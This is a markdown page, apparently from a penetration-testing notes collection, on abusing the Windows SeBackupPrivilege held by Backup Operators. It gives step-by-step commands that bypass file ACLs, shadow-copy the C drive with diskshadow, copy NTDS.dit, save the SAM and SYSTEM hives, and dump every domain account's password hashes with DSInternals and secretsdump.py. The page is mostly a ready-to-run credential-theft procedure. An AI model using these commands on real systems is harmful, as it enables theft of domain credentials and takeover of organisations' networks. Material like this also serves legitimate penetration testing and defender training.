### Content

- [Overview](#overview)
- [SeBackupPrivilege Abuse](#sebackupprivilege-abuse)
	- [Copying a Protected File](#copying-a-protected-file)
	- [Copying NTDS.dit](#copying-ntds.dit)

---
#### Overview

Members of `Backup Operators` group grants its members the `SeBackupPrivilege` and `SeRestorePrivilege` privileges.
The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents.
This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). 

> We need to programmatically copy the data as the default copy won't work, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

---
### SeBackupPrivilege Abuse

> [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`.

Importing Libraries

```PowerShell
PS C:\> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Verifying SeBackupPrivilege is Enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet.

If the privilege is disabled, enable it using `Set-SeBackupPrivilege`

#### Copying a Protected File

``` PowerShell
PS C:\> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.

PS C:\> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

#### Copying NTDS.dit

See [This](%2E%2E/%2E%2E/%2E%2E/Password%20Attacks/Windows/Local%20Attacks#NTDS%2Edit%20Attacks)

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```PowerShell
PS C:\> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

To copy the NTDS.dit from the shadow disk:

- Use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.
	```PowerShell
	PS C:\> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
	```
- Copy the file with the built-in utility `robocopy` -> `/B (copy files in Backup mode)`
	```PowerShell
	PS C:\> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
	```

Back up the `SAM` and `SYSTEM` registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```CMD
C:\> reg save HKLM\SYSTEM SYSTEM.SAV
C:\> reg save HKLM\SAM SAM.SAV
```

Extracting Credentials  through tools like PowerShell `DSInternals` module or `secretsdump.py`.

Using `DSInternals`

``` PowerShell
PS C:\> Import-Module .\DSInternals.psd1
PS C:\> $key = Get-BootKey -SystemHivePath .\SYSTEM.SAV

# password hashes of all accounts:
PS C:\> Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key 

# get a single account by specifying its distinguishedName,objectGuid,objectSid or sAMAccountName atribute:
PS C:\> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=Domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Using `SecretsDump`

``` bash
$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOC
```